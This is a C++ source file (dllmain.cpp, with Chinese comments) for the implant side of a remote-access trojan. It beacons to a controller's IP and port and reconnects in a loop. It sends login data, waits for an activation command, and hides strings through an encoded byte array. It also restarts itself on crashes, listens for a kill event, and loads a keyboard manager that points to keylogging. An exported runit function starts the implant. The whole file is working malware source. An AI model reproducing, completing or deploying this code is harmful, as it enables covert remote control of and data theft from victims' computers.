// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "pch.h"
#include "common/KeyboardManager.h"
#include "common/KernelManager.h"
#include "common/login.h"
#include "common/install.h"
#include <stdio.h>
#include <shlwapi.h>
#pragma comment(lib,"shlwapi.lib")


struct Connect_Address
{
	DWORD dwstact;
	char  strIP[MAX_PATH];
	int   nPort;
	char  ActiveXKeyGuid[MAX_PATH];	// 查找创建的Guid
}g_myAddress = { 0xCC28256,"",0,"" };


DWORD WINAPI DelAXRegThread(LPVOID lpParam);


DWORD	g_dwCurrState;


char g_strSvchostName[MAX_PATH];//服务名
char g_strHost[MAX_PATH];
DWORD g_dwPort;
DWORD g_dwServiceType;

enum
{
	NOT_CONNECT, 			// 还没有连接
	GETLOGINFO_ERROR,		// 获取信息失败
	CONNECT_ERROR,			// 链接失败
	HEARTBEATTIMEOUT_ERROR 	// 心跳超时链接失败
};

DWORD WINAPI main(char *lpServiceName);
//处理异常
LONG WINAPI bad_exception(struct _EXCEPTION_POINTERS* ExceptionInfo) {
	// 发生异常，重新创建进程
	HANDLE	hThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)main, (LPVOID)g_strSvchostName, 0, NULL);
	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);
	return 0;
}

DWORD WINAPI main(char *lpServiceName)
{

	// lpServiceName,在ServiceMain返回后就没有了
	char	strServiceName[256] = {0};
	char	strKillEvent[50] = { 0 };

	//////////////////////////////////////////////////////////////////////////
	// Set Window Station

	//---------------------------------------------------------------------------
	char winsta0[] = { 0x07,0xbc,0xa3,0xa7,0xbb,0xb3,0xa7,0xf5};// winsta0
	char* lpszWinSta = decodeStr(winsta0);						// 解密函数
	HWINSTA hWinSta = OpenWindowStation(lpszWinSta, FALSE, MAXIMUM_ALLOWED);
	//---------------------------------------------------------------------------
	memset(lpszWinSta, 0, winsta0[STR_CRY_LENGTH]);
	delete lpszWinSta;
	if (hWinSta != NULL)
		SetProcessWindowStation(hWinSta);
	//
	//////////////////////////////////////////////////////////////////////////

	 // 这里判断CKeyboardManager::g_hInstance是否为空 如果不为空则开启错误处理 
	 // 这里要在dllmain中为CKeyboardManager::g_hInstance赋值
	if (CKeyM::g_hInstance != NULL)
	{
		//设置异常
		SetUnhandledExceptionFilter(bad_exception);

		lstrcpy(strServiceName, lpServiceName);
		wsprintf(strKillEvent, "%d%d", GetTickCount(), GetTickCount()); // 随机事件名
  
	}
	// 告诉操作系统:如果没有找到CD/floppy disc,不要弹窗口吓人
	SetErrorMode(SEM_FAILCRITICALERRORS);
	strcpy(g_strHost, g_myAddress.strIP);
	g_dwPort = g_myAddress.nPort;
	char	*lpszHost = g_strHost;
	DWORD	dwPort = g_dwPort;


	HANDLE	hEvent = NULL;

	//---这里声明了一个 CClientSocket类
	privatra socketClient;
	BYTE	bBreakError = NOT_CONNECT; // 断开连接的原因,初始化为还没有连接

	//这个循环里判断是否连接成功如果不成功则继续向下
	while (1)
	{
		// 如果不是心跳超时，不用再sleep两分钟
		if (bBreakError != NOT_CONNECT && bBreakError != HEARTBEATTIMEOUT_ERROR)
		{
			// 2分钟断线重连, 为了尽快响应killevent
			for (int i = 0; i < 3000; i++)
			{
				hEvent = OpenEvent(EVENT_ALL_ACCESS, false, strKillEvent);
				if (hEvent != NULL)
				{
					socketClient.Disconnect();
					CloseHandle(hEvent);
					break;
					break;

				}
				// 改一下
				Sleep(60);
			}
		}
		//上线地址


		DWORD dwTickCount = GetTickCount();
		//---调用Connect函数向主控端发起连接
		if (!socketClient.Connect(lpszHost, dwPort))
		{
			bBreakError = CONNECT_ERROR;       //---连接错误跳出本次循环
			continue;
		}
		// 登录
		DWORD dwExitCode = SOCKET_ERROR;
		sendLoginInfo( &socketClient, GetTickCount() - dwTickCount);
		// 接成功后声明了一个CKernelManager 到CKernelManager
		CAdmin	manager(&socketClient, strServiceName, g_dwServiceType, strKillEvent, lpszHost, dwPort);
		// socketClient中的主回调函数设置位这CKernelManager类中的OnReceive 
		//（每个功能类都有OnReceive函数来处理接受的数据他们都继承自父类CManager）
		socketClient.setManagerCallBack(&manager);

		//////////////////////////////////////////////////////////////////////////
		// 等待控制端发送激活命令，超时为10秒，重新连接,以防连接错误
		for (int i = 0; (i < 10 && !manager.IsActived()); i++)
		{
			Sleep(1000);
		}
		// 10秒后还没有收到控制端发来的激活命令，说明对方不是控制端，重新连接，获取是否有效标志
		if (!manager.IsActived())
			continue;

		//////////////////////////////////////////////////////////////////////////

		DWORD	dwIOCPEvent;
		dwTickCount = GetTickCount();// 获取时间戳

		do
		{
			hEvent = OpenEvent(EVENT_ALL_ACCESS, false, strKillEvent);
			dwIOCPEvent = WaitForSingleObject(socketClient.m_hEvent, 100);
			Sleep(500);
		} while (hEvent == NULL && dwIOCPEvent != WAIT_OBJECT_0);

		if (hEvent != NULL)
		{
			socketClient.Disconnect();
			CloseHandle(hEvent);
			break;
		}
	}
#ifdef _DLL
	//////////////////////////////////////////////////////////////////////////
	// Restor WindowStation and Desktop	
	// 不需要恢复桌面，因为如果是更新服务端的话，新服务端先运行，此进程恢复掉了卓面，会产生黑屏
	// 	SetProcessWindowStation(hOldStation);
	// 	CloseWindowStation(hWinSta);
	//
	//////////////////////////////////////////////////////////////////////////
#endif

	SetErrorMode(0);
}


BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
		CKeyM::g_hInstance = (HINSTANCE)hModule;
		CKeyM::m_dwLastMsgTime = GetTickCount();
		CKeyM::Initialization();
		break;
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}




extern "C" __declspec(dllexport) void runit(char* strHost, int nPort)
{
	_asm
	{
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
	}
	HANDLE hThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)main, (LPVOID)NULL, 0, NULL);
	//这里等待线程结束
	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);
}

